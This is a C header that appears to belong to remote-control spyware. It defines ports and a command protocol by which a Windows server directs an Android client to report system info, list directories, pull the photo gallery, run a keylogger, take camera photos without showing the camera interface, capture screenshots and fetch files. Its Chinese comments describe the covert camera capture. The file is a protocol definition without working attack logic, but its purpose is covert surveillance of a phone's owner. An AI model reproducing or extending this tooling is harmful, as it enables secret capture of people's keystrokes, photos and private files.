#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PORT         8080
#define PORT_ANDROID 8080
#define PORT_WINDOWS 8081
#define BUFFER_SIZE  65536   // 64KB，用于传输图片/文件数据
#define MAX_PATH_LEN 512

// ── 命令协议 ──────────────────────────────────────────────
// Windows服务器 → 安卓客户端:
//   CMD:SYSINFO              获取系统信息
//   CMD:LISTDIR:<path>       列出目录内容
//   CMD:GALLERY              获取图库文件列表
//   CMD:KEYLOG:START         开始键盘监听
//   CMD:KEYLOG:STOP          停止键盘监听
//   CMD:CAMERA:CAPTURE       拍照（不打开相机UI）
//   CMD:GETFILE:<path>       获取文件内容
//   CMD:EXIT                 断开连接
// ─────────────────────────────────────────────────────────
// 响应格式:
//   OK:<data>                成功
//   ERR:<message>            失败
//   DATA:<length>\n<bytes>   二进制数据（图片等）
// ─────────────────────────────────────────────────────────

#define CMD_SYSINFO         "CMD:SYSINFO"
#define CMD_LISTDIR         "CMD:LISTDIR:"
#define CMD_GALLERY         "CMD:GALLERY"
#define CMD_KEYLOG_START    "CMD:KEYLOG:START"
#define CMD_KEYLOG_STOP     "CMD:KEYLOG:STOP"
#define CMD_CAMERA_CAPTURE  "CMD:CAMERA:CAPTURE"
#define CMD_SCREENSHOT      "CMD:SCREENSHOT"
#define CMD_GETFILE         "CMD:GETFILE:"
#define CMD_EXIT            "CMD:EXIT"

#define RESP_OK             "OK:"
#define RESP_ERR            "ERR:"
#define RESP_DATA           "DATA:"
#define RESP_KEYEVENT       "KEYEVENT:"
